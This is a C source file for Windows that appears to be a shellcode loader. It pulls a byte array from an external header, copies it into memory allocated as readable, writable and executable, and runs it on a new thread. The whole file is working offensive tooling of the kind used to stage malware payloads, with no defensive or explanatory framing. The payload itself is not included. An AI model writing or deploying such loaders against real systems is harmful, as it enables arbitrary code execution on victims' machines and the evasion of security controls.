#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include <windows.h>

int main( int argc, char * argv[] ) {

    LPVOID mem = VirtualAlloc( NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( mem == NULL ) {
        return 1;
    }

    memcpy( mem, shellcode, shellcode_size );

    HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL );

    if ( hThread == NULL ) {
        /* Free allocated memory if cannot create thread for whatever */
        VirtualFree( mem, 0, MEM_RELEASE );
        return 1;
    }

    WaitForSingleObject( hThread, INFINITE );

    /* Peacefully exit now that the thread has finished, and clean up dangling handles. */
    CloseHandle( hThread );
    VirtualFree( mem, 0, MEM_RELEASE );

    return 0;
}